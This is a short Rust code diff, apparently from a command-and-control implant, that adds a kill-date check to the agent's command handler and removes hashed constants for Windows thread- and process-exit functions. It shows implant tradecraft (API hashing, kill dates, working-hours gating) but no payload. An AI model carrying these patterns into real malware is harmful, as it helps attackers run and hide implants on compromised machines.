@@ -2,13 +2,8 @@ use core::ffi::c_void;
 use libc_print::libc_println;
 use mod_agentcore::instance;
 use mod_protocol_json::protocol::JsonProtocol;
+use mod_win32::nt_time::check_kill_date;
 use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;
-
-// Define the RtlExitUserThread function type
-pub type RtlExitUserThread = unsafe extern "system" fn(exit_status: i32);
-pub type RtlExitUserProcess = unsafe extern "system" fn(exit_status: i32);
-pub const RTL_EXIT_USER_THREAD: usize = 0x2f6db5e8;
-pub const RTL_EXIT_USER_PROCESS: usize = 0x57c72f;
 
 pub fn command_handler() {
     unsafe {
@@ -16,7 +11,13 @@ pub fn command_handler() {
             return;
         }
 
-        exit_command(1);
+        //KillDate
+        if check_kill_date(instance().config.kill_date) {
+            exit_command(1);
+        }
+
+        // !Working Hours -> continue
+
         return;
     }
 }
